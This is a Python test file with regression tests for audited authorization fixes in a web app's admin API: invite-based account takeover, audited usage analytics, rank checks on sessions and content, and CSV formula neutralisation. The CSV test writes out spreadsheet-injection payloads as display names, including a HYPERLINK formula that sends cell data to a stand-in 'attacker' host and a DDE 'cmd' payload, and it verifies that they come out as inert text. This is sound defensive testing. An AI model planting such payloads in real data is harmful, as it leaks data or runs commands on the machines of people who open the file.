"""The admin surface's authorization defects found by the 2026-09-13 audit.

Every test here drives REAL logged-in sessions over HTTP and pins two things
at once: the refusal the fix added, and the legitimate case beside it still
working — a guard that also blocks the everyday job would be reverted, and
then the hole is back.

  F028       an admin claimed a disabled or removed account (a former super
             admin's included) by inviting its address and accepting the link
  F078/N006  per-person usage was readable and exportable on an ordinary
             admin capability, and the read was not audited
  N027       display names went into the usage CSV as live spreadsheet formulas
  F029/N007  the session list and the content viewer never applied the rank
             rule, so an admin could read a super admin's sessions and chats
"""
import csv
import io

import pytest
from fastapi.testclient import TestClient

from app import db
from app.artifacts.render.csv import MAX_CELL_CHARS
from app.authn import invites, store
from app.config import settings
from app.main import app

GOOD_PASSWORD = "a-long-enough-passphrase"


def _uid(username: str) -> int:
    return int(db.get_user_by_username(username)["id"])


def _invite(client, email, *, role="member"):
    return client.post(
        "/admin/api/invitations", json={"email": email, "name": "", "role": role}
    )


def _accept(token):
    with TestClient(app) as c:
        return c.post(
            "/auth/invitations/accept",
            json={"token": token, "name": "Returner", "password": GOOD_PASSWORD},
        )


def _audit_rows(action):
    with db.connection() as con:
        return con.execute(
            "SELECT actor_user_id, target_user_id, meta FROM audit_events "
            "WHERE action = %s ORDER BY id",
            (action,),
        ).fetchall()


def _invitations_for(email):
    with db.connection() as con:
        return con.execute(
            "SELECT count(*) AS n FROM workspace_invitations WHERE lower(email) = lower(%s)",
            (email,),
        ).fetchone()["n"]


# ---------------------------------------------------------------------------
# F028 — inviting an address that already has an account
# ---------------------------------------------------------------------------


def test_an_admin_cannot_invite_a_disabled_super_admin_back_but_can_reinvite_a_disabled_member_they_administer(
    login_client, as_user
):
    admin = login_client("adm", role="admin")
    root = login_client("root", role="super_admin")
    boss = as_user("boss", role="super_admin")
    store.set_status(int(boss["id"]), "disabled")

    refused = _invite(admin, "boss@test.local")
    assert refused.status_code == 403
    assert refused.json()["detail"] == (
        "That address belongs to an account you cannot administer."
    )
    # Nothing to accept: the takeover cannot even start.
    assert _invitations_for("boss@test.local") == 0
    # The account is untouched — still disabled, still a super admin.
    assert store.get_user(int(boss["id"]))["status"] == "disabled"
    assert store.membership(int(boss["id"]))["role"] == "super_admin"

    # The refusal is audited, naming who tried, whom, and why.
    rows = _audit_rows("invitation_refused")
    assert len(rows) == 1
    assert rows[0]["actor_user_id"] == _uid("adm")
    assert rows[0]["target_user_id"] == int(boss["id"])
    assert rows[0]["meta"] == {
        "email": "boss@test.local",
        "role": "member",
        "reason": "outranked_account",
        "target_role": "super_admin",
    }

    # The rank rule is the same one every other member action obeys: a peer
    # super admin does not outrank a super admin either.
    assert _invite(root, "boss@test.local").status_code == 403

    # The legitimate case: an admin brings back a deactivated MEMBER, and the
    # link really does sign that person back in.
    returner = as_user("returner")
    store.set_status(int(returner["id"]), "disabled")
    allowed = _invite(admin, "returner@test.local")
    assert allowed.status_code == 200, allowed.text
    token = allowed.json()["accept_path"].partition("token=")[2]
    accepted = _accept(token)
    assert accepted.status_code == 200, accepted.text
    assert accepted.json()["user"]["email"] == "returner@test.local"
    assert store.get_user(int(returner["id"]))["status"] == "active"
    assert len(_audit_rows("invitation_refused")) == 2  # boss twice, returner never


def test_a_removed_account_can_be_invited_again_only_by_a_super_admin(login_client):
    admin = login_client("adm", role="admin")
    root = login_client("root", role="super_admin")
    login_client("leaver")
    leaver_id = _uid("leaver")

    # The audit's exact sequence: remove someone you outrank, then invite the
    # address back. Removal deletes the membership, so nothing records the
    # rank the account held — it is treated as the highest it could have been.
    assert admin.delete(f"/admin/api/members/{leaver_id}").status_code == 200
    refused = _invite(admin, "leaver@test.local")
    assert refused.status_code == 403
    assert "only a super admin" in refused.json()["detail"]
    assert _invitations_for("leaver@test.local") == 0
    rows = _audit_rows("invitation_refused")
    assert len(rows) == 1
    assert rows[0]["target_user_id"] == leaver_id
    assert rows[0]["meta"]["reason"] == "former_member_unknown_rank"
    assert rows[0]["meta"]["target_role"] == ""

    # A super admin re-inviting a departed colleague is still one call.
    allowed = _invite(root, "leaver@test.local")
    assert allowed.status_code == 200, allowed.text


def test_an_active_member_is_still_a_409_and_a_brand_new_address_is_still_an_ordinary_invite(
    login_client,
):
    admin = login_client("adm", role="admin")
    login_client("bob")

    assert _invite(admin, "bob@test.local").status_code == 409
    # The everyday "already here" mistake is not an account-seizure attempt
    # and does not fill the audit log.
    assert _audit_rows("invitation_refused") == []
    assert _invite(admin, "someone-new@example.com").status_code == 200


def test_the_claim_rule_fails_closed_for_an_actor_role_it_does_not_know():
    removed = {"id": 7, "status": "disabled"}
    refusal = invites.claim_refusal(
        "owner", target_user=removed, target_membership=None
    )
    assert refusal is not None and refusal.status == 403
    assert (
        invites.claim_refusal("super_admin", target_user=removed, target_membership=None)
        is None
    )


# ---------------------------------------------------------------------------
# F078 / N006 — per-person usage is ANALYTICS_READ, and reading it is audited
# ---------------------------------------------------------------------------


def test_the_per_member_usage_table_and_its_export_need_the_analytics_capability(
    login_client,
):
    admin = login_client("adm", role="admin")
    root = login_client("root", role="super_admin")

    # 404, not 403: a capability the caller lacks is a route that is not there.
    assert admin.get("/admin/api/analytics").status_code == 404
    assert admin.get("/admin/api/analytics/export").status_code == 404
    # The workspace-level counters an admin runs the workspace from stay open.
    assert admin.get("/admin/api/overview").status_code == 200

    read = root.get("/admin/api/analytics", params={"range": "7d"})
    assert read.status_code == 200
    assert any(m["email"] == "adm@test.local" for m in read.json()["members"])
    assert root.get("/admin/api/analytics/export").status_code == 200

    # The page read leaves the same kind of trail the export always did —
    # and the refused admin attempts left none, because they never ran.
    viewed = _audit_rows("analytics_viewed")
    assert len(viewed) == 1
    assert viewed[0]["actor_user_id"] == _uid("root")
    assert viewed[0]["meta"] == {"range": "7d"}


# ---------------------------------------------------------------------------
# N027 — the usage CSV neutralises formulas by the artifact writer's rule
# ---------------------------------------------------------------------------


def test_a_formula_in_a_display_name_reaches_the_usage_export_as_inert_text(
    login_client, as_user
):
    root = login_client("root", role="super_admin")
    mallory = as_user("mallory")
    hidden = as_user("hidden")
    long_one = as_user("longname")
    plain = as_user("ramaswamy")
    # Display names are chosen by the invited person, unrestricted.
    exfil = '=HYPERLINK("http://attacker/?x="&A2&B2,"Open")'
    store.set_credentials(int(mallory["id"]), display_name=exfil)
    # A zero-width byte-order mark in front hid the lead from a naive check.
    store.set_credentials(int(hidden["id"]), display_name="﻿@SUM(1+1)*cmd|' /C calc'!A0")
    store.set_credentials(int(long_one["id"]), display_name="=" + "A" * 40_000)
    store.set_credentials(int(plain["id"]), display_name="Ramaswamy Iyer")

    resp = root.get("/admin/api/analytics/export", params={"range": "7d"})
    assert resp.status_code == 200
    table = list(csv.reader(io.StringIO(resp.text)))
    header, rows = table[0], table[1:]
    assert header[:4] == ["name", "email", "role", "status"]
    by_email = {r[1]: dict(zip(header, r)) for r in rows}

    assert by_email["mallory@test.local"]["name"] == "'" + exfil
    assert by_email["hidden@test.local"]["name"] == "'@SUM(1+1)*cmd|' /C calc'!A0"
    # The FIELD is cut at the spreadsheet cell limit, apostrophe counted.
    long_field = by_email["longname@test.local"]["name"]
    assert len(long_field) == MAX_CELL_CHARS and long_field.startswith("'=AAA")

    # The legitimate cells are exactly what they were: an ordinary name, and
    # counts that stay plain numbers a spreadsheet can sum.
    assert by_email["ramaswamy@test.local"]["name"] == "Ramaswamy Iyer"
    assert by_email["ramaswamy@test.local"]["messages"] == "0"
    assert by_email["ramaswamy@test.local"]["role"] == "member"


# ---------------------------------------------------------------------------
# F029 / N007 — reading sessions and content obeys the rank rule
# ---------------------------------------------------------------------------


def test_an_admin_cannot_list_or_revoke_a_super_admins_sessions_but_can_for_a_member(
    login_client,
):
    admin = login_client("adm", role="admin")
    login_client("boss", role="super_admin")
    login_client("worker")

    # Refused with the surface's 404, so it does not confirm what exists.
    listing = admin.get(f"/admin/api/members/{_uid('boss')}/sessions")
    assert listing.status_code == 404
    assert "ip" not in listing.text
    assert admin.post(f"/admin/api/members/{_uid('boss')}/sessions/revoke").status_code == 403

    member_sessions = admin.get(f"/admin/api/members/{_uid('worker')}/sessions")
    assert member_sessions.status_code == 200
    assert len(member_sessions.json()["sessions"]) == 1
    # Your own sessions are always yours to see.
    assert admin.get(f"/admin/api/members/{_uid('adm')}/sessions").status_code == 200


@pytest.fixture()
def content_of(tmp_path, monkeypatch):
    """Give a logged-in client one conversation, one stored upload and one
    report, so a 404 below means REFUSED, never "there was nothing there"."""
    monkeypatch.setattr(settings, "reports_dir", str(tmp_path / "reports"))
    monkeypatch.setattr(settings, "workspace_dir", str(tmp_path / "workspace"))
    (tmp_path / "reports").mkdir()

    def _seed(client, username):
        from app.uploads import upload_root

        conv = f"conv-{username}"
        assert client.post(
            "/history/conversations", json={"id": conv, "title": "private"}
        ).status_code == 200
        assert client.post(
            f"/history/conversations/{conv}/messages",
            json={"role": "user", "content": f"{username}'s private question"},
        ).status_code == 200
        upload_id = f"up-{username}"
        db.save_upload(upload_id, conv, "notes.txt", 5, "ready")
        original = tmp_path / "workspace" / "uploads" / conv / upload_id / "_original"
        assert str(original.parent) == upload_root(conv, upload_id)
        original.mkdir(parents=True)
        (original / "notes.txt").write_bytes(b"hello")
        report = f"{username}-q3.pdf"
        (tmp_path / "reports" / report).write_bytes(b"%PDF-1.4 numbers")
        store.bind_report(report, _uid(username), conv)
        return {"conv": conv, "upload": upload_id, "report": report}

    return _seed


def _content_routes(user_id, seeded):
    return [
        f"/admin/api/members/{user_id}/conversations",
        f"/admin/api/members/{user_id}/conversations/{seeded['conv']}",
        f"/admin/api/members/{user_id}/uploads",
        f"/admin/api/members/{user_id}/reports",
        f"/admin/api/members/{user_id}/uploads/{seeded['upload']}/download",
        f"/admin/api/members/{user_id}/reports/{seeded['report']}",
    ]


def test_an_admin_cannot_read_a_super_admins_conversations_uploads_or_reports_but_can_read_a_members(
    login_client, content_of
):
    admin = login_client("adm", role="admin")
    boss = login_client("boss", role="super_admin")
    bob = login_client("bob")
    boss_content = content_of(boss, "boss")
    bob_content = content_of(bob, "bob")

    for path in _content_routes(_uid("boss"), boss_content):
        resp = admin.get(path)
        assert resp.status_code == 404, path
        assert "private question" not in resp.text and b"%PDF" not in resp.content

    # A peer admin is outside the rule too — equal rank is not a lower rank.
    peer = login_client("peer", role="admin")
    peer_content = content_of(peer, "peer")
    assert admin.get(_content_routes(_uid("peer"), peer_content)[1]).status_code == 404

    # No refused read pretends to have happened in the audit log.
    for action in ("admin_viewed_conversation", "admin_downloaded_upload", "admin_downloaded_report"):
        assert _audit_rows(action) == []

    # The legitimate oversight read of a member still works, route by route.
    for path in _content_routes(_uid("bob"), bob_content):
        assert admin.get(path).status_code == 200, path
    assert len(_audit_rows("admin_viewed_conversation")) == 1


def test_the_member_detail_withholds_a_super_admins_usage_counts_from_an_admin_but_not_a_members(
    login_client,
):
    admin = login_client("adm", role="admin")
    login_client("boss", role="super_admin")
    login_client("bob")

    boss = admin.get(f"/admin/api/members/{_uid('boss')}")
    assert boss.status_code == 200  # the member list itself stays visible
    assert boss.json()["member"]["role"] == "super_admin"
    assert boss.json()["stats"] is None  # withheld, never shown as zeros

    bob = admin.get(f"/admin/api/members/{_uid('bob')}").json()
    assert bob["stats"] is not None and bob["stats"]["conversations"] == 0
    assert admin.get(f"/admin/api/members/{_uid('adm')}").json()["stats"] is not None
